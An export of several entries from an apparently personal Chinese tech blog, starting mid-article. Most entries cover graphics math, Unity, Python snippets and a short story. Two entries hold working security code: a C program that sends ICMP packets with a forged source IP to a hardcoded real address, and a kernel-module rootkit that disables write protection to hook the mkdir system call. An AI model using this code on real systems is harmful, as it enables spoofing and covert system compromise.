其中M1是缩放旋转矩阵，M2是位移矩阵。如果经过多次这样的变换的话，会产生很多的代数项，齐次坐标就是用来解决这个问题的。 所谓齐次坐标就是用n+1个分量来表示n维坐标。例如：二维平面上的点 \\(A(x , y)\\) 用齐次坐标表示为 \\((h_x , h_y , h)\\) ；三维空间中的点 \\(B(x , y , z)\\) 用齐次坐标表示为 \\((h_x , h_y , h_z , h)\\) 。一个向量的齐次表示并不是唯一的，齐次坐标中的h取不同值表示的都是同一个点，比如 \\((8 , 4 , 2)\\) 、 \\((4 , 2 , 1)\\) 表示的都是二维平面上的点 \\((4 , 2)\\) 。下面来看一个等式： $$\\begin{bmatrix} x & y & z & 1 \\end{bmatrix} \\begin{bmatrix} 1 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 0 \\\\ 0 & 0 & 1 & 0 \\\\ a & b & c & 1\\end{bmatrix} = \\begin{bmatrix} x+a & y+b & z+c & 1 \\end{bmatrix}$$ 可以看出，一个点的位移，可以用齐次坐标的右乘来表示。 矩阵的缺点 不直观 数据冗余 大量矩阵相乘容易产生坏数据 欧拉角 在三维坐标系中，要转动某个物体，可以通过依次绕其各个轴旋转来实现。那么表示一个物体的方位，就可以通过这三个角来表示。 欧拉角表示的是物体的最终方位而不是旋转过程。例如我们说将一个物体旋转到 \\((ψ, θ, φ)\\) ，这个方位是相对于物体 未旋转 时的角度，而 不是 将当前物体绕z轴旋转ψ， 绕x轴旋转θ， 绕y轴旋转φ。 万向节运动 因为用欧拉角表示方位与旋转的次序无关。unity中默认的是z-x-y，这样的次序就导致了z轴的旋转会影响x,y轴的旋转，x轴的旋转会影响y轴的旋转。 这样的旋转类似于万向节的运动。 万向锁 假设物体按heading-pitch-bank的方式旋转，例如在下面的 示例 中，绿色圈代表y轴的旋转，红色圈代表x轴的旋转，蓝色轴代表z轴的旋转。初始状态如下图： 当绕x轴旋转90度时，发现此时的z轴和以前y轴重合了。 这就意味着，最开始的y轴旋转和此时的z轴旋转是等效的，z轴的旋转可以通过y轴的旋转来实现，可以被认为是无效的。那么欧拉角就损失了一个维度。例如在Unity 3D中： 方位一致 插值计算 欧拉角对计算物体旋转差值产生影响。以Unity3D为例。 假如一个物体的初始方位为（90， 0， 0）， 要旋转到（0， 90， 90） 直观上看，就是将HelloWord立起来。但却有三个坐标轴做了旋转，通过分析其中的插值可以看到，它运动的路径和我们期望的路径并不一样。 计算错误的原因：因为是以万向节的形式旋转，物体旋转到某个位置，有可能需要同时旋转两个或三个坐标轴。此时真正的球面差值和欧拉角的差值不同。旋转依赖的参数太多。 复数与旋转 要解决差值问题，还是要减少旋转依赖的参数。但矩阵的数据太冗余，好在数学家们发现如下规律： 对于复数： \\( p = x + yi $ $ q = cosθ + i sinθ\\) $ pq = (x + yi)(cosθ + isinθ) = (xcosθ - ysinθ) + (xsinθ+ ycosθ)i $ 这对于上面的旋转矩阵是不是很像？只要将复数的实部和虚部看做坐标轴，那么 p 可以看做一个向量，pq就可以看p成旋转θ角之后的向量。 四元数 相对于二维坐标中的复数，数学家还定义了三维坐标中的四元数： \\(p = w + xi + yj + zk\\) 其中： \\(i&#94;2 = j&#94;2 = k&#94;2 = -1\\) \\(ij = k, ji = -k\\) \\(jk = i, kj = -i\\) \\(ki = j, ik = -j\\) 设四元数： \\( q = [cos(\\theta /2), nsin(\\theta/2)] = [cos(\\theta/2), ({n}_{x}sin(\\theta/2), {n}_{y}sin(\\theta/2), {n}_{z}sin(\\theta/2))]\\) 对于任意四元数： \\( p = [w, (x, y, z)]\\) 那么对于等式： \\( p' = qpq&#94;{-1} = [cos(\\theta /2), nsin(\\theta/2)][w, (x, y, z)][cos(\\theta /2), -nsin(\\theta/2)]\\) 展开后可以得到类似于三维旋转矩阵的东西。这说明四元数可以用在物体的旋转计算中。","tags":"计算机图形学","url":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-ju-zhen.html","loc":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-ju-zhen.html"},{"title":"python代码段","text":"Python代码段 python代码段 Python代码段 遍历文件夹 打zip包 删除文件夹 创建文件夹 拷贝文件 按编码转换字符串 运行命令 下面总结一些日常Python代码段 遍历文件夹 #!Python import os def getAllFile ( dirPath ): ret = [] allsub = os . listdir ( dirPath ) for sub in allsub : subPath = \" %s / %s \" % ( dirPath , sub ) if os . path . isfile ( subPath ): ret . append ( subPath ) if os . path . isdir ( subPath ): ret . extend ( getAllFile ( subPath )) return ret 打zip包 #!Python import zipfile , os zipPakFile = zipfile . ZipFile ( zipflieName , 'w' , zipfile . ZIP_DEFLATED ) for item in fileList : zipPakFile . write ( item ) zipPakFile . close () 删除文件夹 #!Python import shutil #True表示即使为空也强制删除，如果不加True, 只能删除空文件夹 shutil . rmtree ( dirPath , True ) 创建文件夹 #!Python if not os . path . isdir ( dir ): #makedirs和mkdir的区别是，如果父目录不存在，makedirs会创建父目录，而mkdir不会python os . makedirs ( dir ) 拷贝文件 #!python import os import shutil imageName = os . path . basename ( image ) shutil . copy ( image , \" %s / %s \" % ( pelicanconf . OUTPUT_PATH , imageName )) 按编码转换字符串 def decode_bytes ( byte_str , encoding ): if len ( encoding ) > 0 : return byte_str . decode ( encoding ) else : return byte_str 运行命令 #encoding 为输出格式 def execute_cmd ( cmd , encoding = \"\" ): print ( cmd ) pipe = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) #实时读出一些数据 while pipe . poll () == None : line_byte = pipe . stdout . readline () print ( decode_bytes ( line_byte , encoding ), end = \"\" ); out = pipe . stdout . read () if len ( out ) > 0 : print ( decode_bytes ( out , encoding ), end = \"\" ); err = pipe . stderr . read () if len ( err ) > 0 : raise Exception ( \"execute cmd error:\" , decode_bytes ( err , encoding ))","tags":"编程语言","url":"http://www.vmetu.com/blog/pythondai-ma-duan.html","loc":"http://www.vmetu.com/blog/pythondai-ma-duan.html"},{"title":"glScissor函数","text":"glScissor函数用来剪裁一个绘制区域，比如只要展示纹理的一部分，示例： void myDisplay ( void ) { glEnable ( GL_SCISSOR_TEST ); glScissor ( 50 , 50 , 50 , 50 ); glClear ( GL_COLOR_BUFFER_BIT ); glRectf ( 0 , 0 , 200 , 200 ); glFlush (); glDisable ( GL_SCISSOR_TEST ); } 这里本来要绘制一个(0,0)位置开始宽高都为200的矩形，加上glScissor语句后，只绘制从(50, 50)开始宽高都为50的这部分区域。","tags":"OpenGL","url":"http://www.vmetu.com/blog/glscissorhan-shu.html","loc":"http://www.vmetu.com/blog/glscissorhan-shu.html"},{"title":"VS中Error C2001的解决办法","text":"VS中Error C2001的解决办法 今天遇到一个问题，在VS2010工程中，出现中文字符串时，出现了如下错误： error C2001: newline in constant error C2143: syntax error : missing ')' before '}' error C2143: syntax error : missing ';' before '}' 产生原因可以参照： http://blog.163.com/zhaowenjia1989@126/blog/static/1094985792010224153119/ 一些结局办法可以参照： http://www.cnblogs.com/kuliuheng/p/3397796.html 还有一个简单的办法： 1. 在VS中打开该代码文件。 2. 选择VS菜单栏中 File -> Advanced Save Options 选择中文的编码： 重新编译，OK","tags":"编程语言","url":"http://www.vmetu.com/blog/vszhong-error-c2001de-jie-jue-ban-fa.html","loc":"http://www.vmetu.com/blog/vszhong-error-c2001de-jie-jue-ban-fa.html"},{"title":"Mathf相关函数","text":"这里对Mathf相关函数做一个简要说明，抄的。 Mathf.Abs绝对值## 计算并返回指定参数 f 绝对值。 Mathf.Acos反余弦 static function Acos (f : float) : float 以弧度为单位计算并返回参数 f 中指定的数字的反余弦值。 Mathf.Approximately近似 static function Approximately (a : float, b: float) : bool 比较两个浮点数值，看它们是否非常接近, 由于浮点数值不精确，不建议使用等于来比较它们。例如，1.0==10.0/10.0也许不会返回true。 public class example : MonoBehaviour { publicvoid Awake() { if(Mathf.Approximately(1.0F, 10.0F / 10.0F)) print(\"same\"); } } Mathf.Asin反正弦 static function Asin (f : float) : float 以弧度为单位计算并返回参数 f 中指定的数字的反正弦值。 Mathf.Atan2反正切 static function Atan2 (y : float, x :float) : float 以弧度为单位计算并返回 y/x 的反正切值。返回值表示相对直角三角形对角的角，其中 x 是临边边长，而 y 是对边边长。 返回值是在x轴和一个二维向量开始于0个结束在(x,y)处之间的角。 public class example : MonoBehaviour { publicTransform target; voidUpdate() { Vector3relative = transform.InverseTransformPoint(target.position); floatangle = Mathf.Atan2(relative.x, relative.z) * Mathf.Rad2Deg; transform.Rotate(0,angle, 0); } } Mathf.Atan反正切 static function Atan (f : float) :float 计算并返回参数 f 中指定的数字的反正切值。返回值介于负二分之 pi 与正二分之 pi 之间。 Mathf.CeilToInt最小整数 static function CeilToInt (f : float) : int 返回最小的整数大于或等于f。 Mathf.Ceil上限值 static function Ceil (f : float) : float 返回 f 指定数字或表达式的上限值。数字的上限值是大于等于该数字的最接近的整数。 Mathf.Clamp01 static function Clamp01 (value : float) :float 限制value在0,1之间并返回value。如果value小于0，返回0。如果value大于1,返回1，否则返回value 。 Mathf.Clamp static function Clamp (value : float, min :float, max : float) : float 限制value的值在min和max之间， 如果value小于min，返回min。 如果value大于max，返回max，否则返回value static function Clamp (value : int, min :int, max : int) : int 限制value的值在min和max之间，并返回value。 Mathf.ClosestPowerOfTwo最近的二次方 static function ClosestPowerOfTwo (value :int) : int 返回距离value最近的2的次方数。 Mathf.Cos余弦 static function Cos (f : float) : float 返回由参数 f 指定的角的余弦值（介于 -1.0 与 1.0 之间的值）。 Mathf.Deg2Rad度转弧度 static var Deg2Rad : float 度到弧度的转化常量。（只读） 这等于(PI * 2) / 360。 Mathf.Mathf.Rad2Deg 弧度转度 static var Rad2Deg : float 弧度到度的转化常量。（只读） 这等于 360 / (PI * 2)。 Mathf.DeltaAngle增量角 static function DeltaAngle (current :float, target : float) : float 计算给定的两个角之间最短的差异。 // Prints 90 Debug.Log(Mathf.DeltaAngle(1080,90)); Mathf.Epsilon小正数 static var Epsilon : float 一个很小的浮点数值。（只读） 最小的浮点值，不同于0。 以下规则： - anyValue + Epsilon = anyValue - anyValue - Epsilon = anyValue - 0 + Epsilon = Epsilon - 0 - Epsilon = -Epsilon 一个在任意数和Epsilon的之间值将导致在任意数发生截断误差。 public class example : MonoBehaviour { boolisEqual(float a, float b) { if(a >= b - Mathf.Epsilon && a <= b + Mathf.Epsilon) returntrue; else returnfalse; } } Mathf.Exp指数 static function Exp (power : float) : float 返回 e 的 power 次方的值。 Mathf.FloorToInt最大整数 static function FloorToInt (f : float) :int 返回最大的整数，小于或等于f。 Mathf.Floor下限值 static function Floor (f : float) : float 返回参数 f 中指定的数字或表达式的下限值。下限值是小于等于指定数字或表达式的最接近的整数。 Mathf.Infinity正无穷 static var Infinity : float 表示正无穷，也就是无穷大，∞ （只读） Mathf.InverseLerp反插值 计算两个值之间的Lerp参数。也就是value在from和to之间的比例值。 //现在参数是3/5 float parameter =Mathf.InverseLerp(walkSpeed, runSpeed, speed); Mathf.IsPowerOfTwo是否2的幂 static function IsPowerOfTwo (value : int): bool 如果该值是2的幂，返回true。 // prints false Debug.Log(Mathf.IsPowerOfTwo(7)); // prints true Debug.Log(Mathf.IsPowerOfTwo(32)); Mathf.LerpAngle插值角度 static function LerpAngle (a : float, b :float, t : float) : float 和Lerp的原理一样，当他们环绕360度确保插值正确。 a和b是代表度数。 public class example : MonoBehaviour { publicfloat minAngle = 0.0F; publicfloat maxAngle = 90.0F; voidUpdate() { floatangle = Mathf.LerpAngle(minAngle, maxAngle, Time.time); transform.eulerAngles= new Vector3(0, angle, 0); } } Mathf.Lerp插值 static function Lerp (from : float, to :float, t : float) : float 基于浮点数t返回a到b之间的插值，t限制在0～1之间。 当t = 0返回from，当t = 1 返回to。当t = 0.5 返回from和to的平均值。 Mathf.Log10基数10的对数 static function Log10 (f : float) : float 返回f的对数，基数为10。 Mathf.Log对数 static function Log (f : float, p : float): float 返回参数 f 的对数。 // logarithm of 6 in base 2 //以2为底6的对数 // prints 2.584963 print(Mathf.Log(6, 2)); Mathf.Max最大值 static function Max (a : float, b : float): float static function Max (params values :float[]) : float 返回两个或更多值中最大的值。 Mathf.Min最小值 static function Min (a : float, b : float): float static function Min (params values :float[]) : float 返回两个或更多值中最小的值。 Mathf.MoveTowardsAngle移动角 static function MoveTowardsAngle (current :float, target : float, maxDelta : float) : float 像MoveTowards,但是当它们环绕360度确保插值正确。 变量current和target是作为度数。为优化原因，maxDelta负值的不被支持，可能引起振荡。从target角推开current，添加180度角代替。 Mathf.MoveTowards移向 static function MoveTowards (current :float, target : float, maxDelta : float) : float 改变一个当前值向目标值靠近。 这实际上和 Mathf.Lerp相同，而是该函数将确保我们的速度不会超过maxDelta。maxDelta为负值将目标从推离。 Mathf.NegativeInfinity负无穷 static var NegativeInfinity : float 表示负无穷，也就是无穷小，-∞（只读） Mathf.NextPowerOfTwo下个2的幂 Mathf.PingPong乒乓 static function PingPong (t : float, length: float) : float 0到length之间往返。t值永远不会大于length的值，也永远不会小于0。 The returned value will move back and forthbetween 0 and length. 返回值将在0和length之间来回移动。 Mathf.PI圆周率 static var PI : float PI（读pai）的值，也就是圆周率（π）的值3.14159265358979323846...（只读） Mathf.Pow次方 static function Pow (f : float, p : float): float 计算并返回 f 的 p 次方。 Mathf.Repeat重复 static function Repeat (t : float, length :float) : float 循环数值t，0到length之间。t值永远不会大于length的值，也永远不会小于0。 这是类似于模运算符，但可以使用浮点数。 public class example : MonoBehaviour { voidUpdate() { transform.position= new Vector3(Mathf.Repeat(Time.time, 3), transform.position.y,transform.position.z); } } Mathf.RoundToInt四舍五入到整数 static function RoundToInt (f : float) :int 返回 f 指定的值四舍五入到最近的整数。 如果数字末尾是.5，因此它是在两个整数中间，不管是偶数或是奇数，将返回偶数。 Mathf.Round四舍五入 static function Round (f : float) : float 返回浮点数 f 进行四舍五入最接近的整数。 如果数字末尾是.5，因此它是在两个整数中间，不管是偶数或是奇数，将返回偶数。 Mathf.Sign符号 static function Sign (f : float) : float 返回 f 的符号。 当 f 为正或为0返回1，为负返回-1。 Mathf.Sin正弦 static function Sin (f : float) : float 计算并返回以弧度为单位指定的角 f 的正弦值。 Mathf.SmoothDampAngle平滑阻尼角度 static function SmoothDampAngle (current :float, target : float, ref currentVelocity : float, smoothTime : float,maxSpeed : float = Mathf.Infinity, deltaTime : float = Time.deltaTime) : float 参数 current : 当前的位置。 target : 我们试图达到的位置。 currentVelocity : 当前速度，这个值在你访问这个函数的时候会被随时修改。 smoothTime : 要到达目标位置的近似时间，实际到达目标时要快一些。 maxSpeed : 可选参数，允许你限制的最大速度。 deltaTime : 上次调用该函数到现在的时间。缺省为Time.deltaTime。 随着时间的推移逐渐改变一个给定的角度到期望的角度。 这个值通过一些弹簧减震器类似的功能被平滑。这个函数可以用来平滑任何一种值，位置，颜色，标量。最常见的是平滑一个跟随摄像机。 //一个简单的平滑跟随摄像机 //跟随目标的朝向 public class example : MonoBehaviour { publicTransform target; publicfloat smooth = 0.3F; publicfloat distance = 5.0F; privatefloat yVelocity = 0.0F; voidUpdate() { //从目前的y角度变换到目标y角度 floatyAngle = Mathf.SmoothDampAngle(transform.eulerAngles.y, target.eulerAngles.y,ref yVelocity, smooth); //target的位置 Vector3position = target.position; //然后，新角度之后的距离偏移 position+= Quaternion.Euler(0, yAngle, 0) * new Vector3(0, 0, -distance); //应用位置 transform.position= position; //看向目标 transform.LookAt(target); } } Mathf.SmoothDamp平滑阻尼 static function SmoothDamp (current :float, target : float, ref currentVelocity : float, smoothTime : float,maxSpeed : float = Mathf.Infinity, deltaTime : float = Time.deltaTime) : float 参数 current : 当前的位置。 target : 我们试图达到的位置。 currentVelocity : 当前速度，这个值在你访问这个函数的时候会被随时修改。 smoothTime : 要到达目标位置的近似时间，实际到达目标时要快一些。 maxSpeed : 可选参数，允许你限制的最大速度。 deltaTime : 上次调用该函数到现在的时间。缺省为Time.deltaTime。 描述 随着时间的推移逐渐改变一个值到期望值。 这个值就像被一个不会崩溃的弹簧减振器一样被平滑。这个函数可以用来平滑任何类型的值，位置，颜色，标量。 public class example : MonoBehaviour { publicTransform target; publicfloat smoothTime = 0.3F; privatefloat yVelocity = 0.0F; voidUpdate() { floatnewPosition = Mathf.SmoothDamp(transform.position.y, target.position.y, refyVelocity, smoothTime); transform.position= new Vector3(transform.position.x, newPosition, transform.position.z); } } Mathf.SmoothStep平滑插值 static function SmoothStep (from : float,to : float, t : float) : float 和lerp类似，在最小和最大值之间的插值，并在限制处渐入渐出。 public class example : MonoBehaviour { publicfloat minimum = 10.0F; publicfloat maximum = 20.0F; voidUpdate() { transform.position= new Vector3(Mathf.SmoothStep(minimum, maximum, Time.time), 0, 0); } } Mathf.Sqrt平方根 static function Sqrt (f : float) : float 计算并返回 f 的平方根。 Mathf.Tan正切 static function Tan (f : float) : float 计算并返回以弧度为单位 f 指定角度的正切值。","tags":"Unity","url":"http://www.vmetu.com/blog/mathfxiang-guan-han-shu.html","loc":"http://www.vmetu.com/blog/mathfxiang-guan-han-shu.html"},{"title":"Unity2D帧动画实现的两种方式","text":"在游戏制作过程中，经常用到帧动画，这里介绍两种实现帧动画的方式 源材料准备 序列帧所用到的图片： 生成这些序列帧所用到的资源可以参考： http://www.raywenderlich.com/61532/unity-2d-tutorial-getting-started 1. 脚本方式实现 脚本实现的方式在上面的链接中有介绍，这里把列出源码： using UnityEngine ; using System . Collections ; public class Zombie : MonoBehaviour { public Sprite [] m_sprits ; public int m_frameRate ; ／／ 帧率 float m_frameTime ; SpriteRenderer m_spriteRenderer ; // Use this for initialization void Start () { m_frameTime = 1.0 f / ( float ) m_frameRate ; m_spriteRenderer = GetComponent < SpriteRenderer > (); } // Update is called once per frame void Update () { m_frameTime -= Time . deltaTime ; if ( m_frameTime < 0.0 f ) { int index = 0 ; for (; index < m_sprits . Length ; index ++ ) { if ( m_sprits [ index ] == m_spriteRenderer . sprite ) { break ; } } index = ( index + 1 ) % m_sprits . Length ; m_spriteRenderer . sprite = m_sprits [ index ] ; m_frameTime = 1.0 f / ( float ) m_frameRate ; } } } 2.编辑器实现 帧动画也可以由Unity的动画编辑器来实现，实现方式如下。 打开动画编辑器 先在场景中以序列帧的第一帧创建一个精灵，选中它，然后通过快捷键Ctrl + 6 或者菜单中的 Window -> Animation打开动画编辑器。在弹出窗口的左上角点击 Add Property , 会弹出一个让你保存动画的界面，如图： 输入一个名字将其保存起来。 根据上面程序实现的方法，我们知道绘制精灵是通过SpriteRender来实现的, 所以在动画编辑器中可以增加一个SpriteRender属性： 之后就可以将序列帧拖入动画编辑器中： 加好之后，点击左上角的三角符号，就可以发现Unity编辑器中的僵尸动起来了。","tags":"Unity","url":"http://www.vmetu.com/blog/unity2dzheng-dong-hua-shi-xian-de-liang-chong-fang-shi.html","loc":"http://www.vmetu.com/blog/unity2dzheng-dong-hua-shi-xian-de-liang-chong-fang-shi.html"},{"title":"Pelican安装过程","text":"今天安装了Pelican，下面来说下过程和遇到的问题 安装Python，因为在Mac下，省掉这一步 安装pip( 下载地址 ), 解压后运行： python setup.py install 安装 安装pelican， 运行 pip install pelican 安装markdown， 运行 pip install markdown 启动pelican创建工程，pelican－quickstart, 此时有可能出现如下错误： Traceback ( most recent call last ): File \"/usr/local/bin/pelican-quickstart\" , line 7 , in < module > from pelican.tools.pelican_quickstart import main File \"/Library/Python/2.7/site-packages/pelican/__init__.py\" , line 20 , in < module > from pelican.generators import ( ArticlesGenerator , PagesGenerator , File \"/Library/Python/2.7/site-packages/pelican/generators.py\" , line 22 , in < module > from pelican.readers import Readers File \"/Library/Python/2.7/site-packages/pelican/readers.py\" , line 24 , in < module > from six.moves.html_parser import HTMLParser ImportError : No module named html_parser 这时只需要更改一下源文件即可： vim /Library/Python/2.7/site-packages/pelican/readers.py 。 将24行的： from six.moves.html_parser import HTMLParser 换成： from HTMLParser import HTMLParser 即可","tags":"Pelican","url":"http://www.vmetu.com/blog/pelicanan-zhuang-guo-cheng.html","loc":"http://www.vmetu.com/blog/pelicanan-zhuang-guo-cheng.html"},{"title":"一个能处理json的FieldStorage","text":"一个能处理json的FieldStorage @(编程语言)[python] 一般的，FieldStorage是不能处理Json请求的，这里可以改写它的一个方法，使其具备接收json请求的能力。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #!/usr/bin/env python #encoding:utf-8 import cgi import urlparse import json import os class JSONFieldStorage ( cgi . FieldStorage , object ): \"\"\" FieldStorage类的改写，使其具有接收json的能力 \"\"\" def read_urlencoded ( self ): \"\"\"Internal: read data in query string format.\"\"\" qs = self . fp . read ( self . length ) try : self . _json = json . loads ( qs ) except Exception , e : self . _json = None if self . _json == None : try : self . _json = json . loads ( self . qs_on_post ) except : self . _json = None if self . qs_on_post : qs += '&' + self . qs_on_post self . list = list = [] for key , value in urlparse . parse_qsl ( qs , self . keep_blank_values , self . strict_parsing ): list . append ( cgi . MiniFieldStorage ( key , value )) self . skip_lines () def getJson ( self ): try : return self . _json except : return None 使用方法和FieldStorage一致，要得到json请求时只需要调用getJson即可","tags":"编程语言","url":"http://www.vmetu.com/blog/yi-ge-neng-chu-li-jsonde-fieldstorage.html","loc":"http://www.vmetu.com/blog/yi-ge-neng-chu-li-jsonde-fieldstorage.html"},{"title":"linux下伪装ICMP攻击的实现","text":"linux下伪装ICMP攻击的实现 @(编程语言)[信息安全, C] #include <sys/socket.h> #include <sys/types.h> #include <netinet/ip.h> #include <netinet/ip_icmp.h> #include <string.h> #include \"exam.h\" char buffer [ 1024 ]; /*校验码的计算*/ unsigned short cksum ( unsigned char * data , int len ) { int sum = 0 ; int odd = len & 0x01 ; unsigned short * value = ( unsigned short * ) data ; while ( len & 0xfffe ) { sum += * ( unsigned short * ) data ; data += 2 ; len -= 2 ; } if ( odd ) { unsigned short tmp = (( * data ) << 8 ) & 0xff00 ; sum += tmp ; } sum = ( sum >> 16 ) + ( sum & 0xffff ); sum += ( sum >> 16 ) ; return ~ sum ; } int main () { int s ; int ret = 0 ; int on = 1 ; struct icmp * icmp ; struct ip * ip = ( struct ip * ) buffer ; struct sockaddr_in addr ; s = socket ( AF_INET , SOCK_RAW , 1 ); //使用原始套接字 failure ( \"socket\" , s , - 1 ); memset ( buffer , '\\0' , 1024 ); addr . sin_family = AF_INET ; addr . sin_addr . s_addr = inet_addr ( \"119.75.213.51\" ); //百度的ip，目的是伪造IP地址给百度发数据包 ret = setsockopt ( s , IPPROTO_IP , IP_HDRINCL , & on , sizeof ( on )); //自己构造ip头的选项 failure ( \"setsockopt\" , ret , - 1 ); /*ip头的信息*/ ip -> ip_hl = 5 ; ip -> ip_v = 4 ; ip -> ip_tos = 0 ; ip -> ip_len = htons ( 32 ); ip -> ip_id = 0 ; ip -> ip_off = 0 ; ip -> ip_ttl = 56 ; ip -> ip_p = 1 ; ip -> ip_sum = 0 ; ip -> ip_src . s_addr = inet_addr ( \"192.168.205.199\" ); //这是伪造的ip，本机的ip当然不是这个啦 ip -> ip_dst . s_addr = inet_addr ( \"119.75.213.51\" ); /*icmp头信息*/ icmp = ( struct icmp * )( buffer + 20 ); icmp -> icmp_type = ICMP_ECHO ; icmp -> icmp_code = 0 ; icmp -> icmp_cksum = 0 ; icmp -> icmp_id = 1234 ; icmp -> icmp_seq = 8080 ; icmp -> icmp_cksum = cksum (( char * ) icmp , 12 ); /*发送*/ ret = sendto ( s , buffer , 32 , 0 , ( struct sockaddr * ) & addr , sizeof ( addr )); failure ( \"send\" , ret , - 1 ); return 0 ; } PS: exam.h是我为了些程序方便而定义的一些错误处理的宏，文件内容如下： #ifndef EXAM_H #define EXAM_H #include <stdio.h> #include <stdlib.h> #define failure(msg, ret, error_code) \\ { \\ if(ret == error_code) \\ { \\ perror(msg); \\ exit(EXIT_FAILURE); \\ } \\ } #define success(msg, ret, success_code)\\ { \\ if(ret != success_code) \\ { \\ perror(msg); \\ exit(EXIT_FAILURE); \\ } \\ } #endif","tags":"编程语言","url":"http://www.vmetu.com/blog/linuxxia-wei-zhuang-icmpgong-ji-de-shi-xian.html","loc":"http://www.vmetu.com/blog/linuxxia-wei-zhuang-icmpgong-ji-de-shi-xian.html"},{"title":"一个简单的linux rootkit","text":"一个简单的linux rootkit @(编程语言)[信息安全, Linux, rootkit] 下面提供一个相对完整的rootkit，在Fedora 12上编译运行成功。 #include <linux/module.h> #include <linux/kernel.h> #include <asm/unistd.h> MODULE_LICENSE ( \"GPL\" ); // addr of sys_call_talbe = 0xc077e3a8，这个值是在/boot目录下，System.map或是以System.map打头的文件中找到的。 void ** sys_call_table = ( void ** ) 0xc077e3a8 ; int ( * orig_mkdir )( const char * path ); //定义一个函数指正，用于保存挟制以前的初始值 int hack_mkdir ( const char * path ) //定义一个替换函数，它将用来替换某个系统调用 { printk ( \"<0> this is in hack_mkdir \\n \" ); return 0 ; } 下面两个函数比较重要，因为在较新的内核中，sys_call_table的内存是只读的，详见entry_32.S: .section .rodata , \"a\" #include \"syscall_table_32.S\" 但我们可以通过该cr0寄存器的第16位来取消写保护，cr0寄存器如下： 第16位WP位，它控制是否允许处理器向标志为只读属性的内存页写入数据，如果WP=0, 禁用写保护功能。 unsigned int clear_cr0 ( void ) // 将WP清0 ， 并返回清0前的值 { unsigned int cr0 = 0 ; unsigned int ret ; asm volatile ( \"movl %%cr0, %%eax\" : \"=a\" ( cr0 ) ); ret = cr0 ; cr0 &= 0xfffeffff ; asm volatile ( \"movl %%eax, %%cr0\" : : \"a\" ( cr0 ) ); return ret ; } void setback_cr0 ( unsigned int val ) // 将cr0设为val { asm volatile ( \"movl %%eax, %%cr0\" : : \"a\" ( val ) ); } static int __init begin ( void ) { unsigned int cr0 ; orig_mkdir = sys_call_table [ __NR_mkdir ] ; // 保存mkdir原来的的地址 printk ( \"<0> sys_call_table[__NR_mkdir] = %x\\n\" , ( unsigned int ) sys_call_table [ __NR_mkdir ] ); cr0 = clear_cr0 (); sys_call_table [ __NR_mkdir ] = hack_mkdir ; // 挟持 setback_cr0 ( cr0 ); printk ( \"<0> sys_call_table[__NR_mkdir] = %x\\n\" , ( unsigned int ) sys_call_table [ __NR_mkdir ] ); return 0 ; } static void __exit end ( void ) { int cr0 ; cr0 = clear_cr0 (); sys_call_table [ __NR_mkdir ] = orig_mkdir ; // 恢复mkdir系统调用 setback_cr0 ( cr0 ); } module_init ( begin ); module_exit ( end ); 运行效果： 加载模块后，mkdir命令失效。","tags":"编程语言","url":"http://www.vmetu.com/blog/yi-ge-jian-dan-de-linux-rootkit.html","loc":"http://www.vmetu.com/blog/yi-ge-jian-dan-de-linux-rootkit.html"},{"title":"梦蝶","text":"梦蝶 @(杂七杂八)[胡思乱想] 那只蝴蝶又来了。 不知是蝴蝶闯入了他的梦，还是他的梦里有蝴蝶。 他依旧伸出了手去捕那只蝶，那蝶也依旧漂亮地一转，飞到他手不能及的地方，他依旧去追。 也是依旧的，他或是绊了石头，或是踩了鞋带，或是挂了树枝，惊出了一身冷汗，喘着粗气醒了来。 他对这个梦不能释怀已经很久了，每次醒来，心里总是空空的，过了许久，仍觉得少了些东西，但仔细去一想，却又真的想不去来。 他也要回故土了，他在年轻的时候对回乡定居的老人是很不屑的。谁知，他老了也不例外。他常想，这可能是他一生中最有讽刺意味的一件事。离开家乡有快有半个世纪了，年轻的时候东奔西闯的，对什么事都放得开，谁知老了老了却越发执着了。 儿子在给他准备着行李，他随便看了看，便走了出去。在不远处的公园，他找了张椅子坐下来，静静地看这草地上玩耍的小孩子。他一直觉得与小孩子们相处得久了，自己也会变的年青。忽然，他兴奋起来，那几个孩子竟在追逐一只蝴蝶！ 那只蝴蝶就如他在梦中看到的那只一样，翩翩然地飞着，没当孩子们的手靠近，它也是漂亮地一转身，飞到一个意所不及的地方，却又不飞远，好像它出来就是来和孩子们玩一样。渐渐地，孩子们被蝴蝶引出了草坪，在公园的路上跑起来。他笑了：在梦中，他不是和这些孩子一样么？ 路边上的几对恋人，也觉得有趣，便也加入了这捕蝶的行列中。大家跑着，笑着，闹着，都在围着那只蝴蝶打转。他几乎就要站起来，跑到他们中间去，和他们一起去捕那只蝶。他注意到自己的意图，不禁一笑：你还以为自己年青啊？你现在还有他们的身手么？要是真落个像梦一般的下场，那可能真是晚节不保了。这时，他却又不服：我在年青的时候，那是一定捕得到的！ 年青？他心头一震，我也年青过啊！蓦地，他明白了，他明白他为什么若有所失了，他再也不能重回他的青春时代了，就像那只蝴蝶，只可回味，却是永远不能企及的！家乡啊，自己年青时的梦想，年青时的时光，都是在那里！哪里是自己想回家乡了，分明是家乡的年青的自己的召唤！还记得么，儿时的小山，少时的玩伴，还有那第一次暗恋的同桌女生，以及新婚时的妻子？ 儿子来叫父亲回去了，却看到坐在长椅中，老泪纵横的他。儿子唤了他一声，良久，他才抬起手，指着已经暗下来的天空：\"那……那逝去的蝴蝶……再也……捕不回来了……\"","tags":"杂七杂八","url":"http://www.vmetu.com/blog/meng-die.html","loc":"http://www.vmetu.com/blog/meng-die.html"},{"title":"《聊斋志异》笔记","text":"《聊斋志异》笔记 @(杂七杂八)[读书笔记] 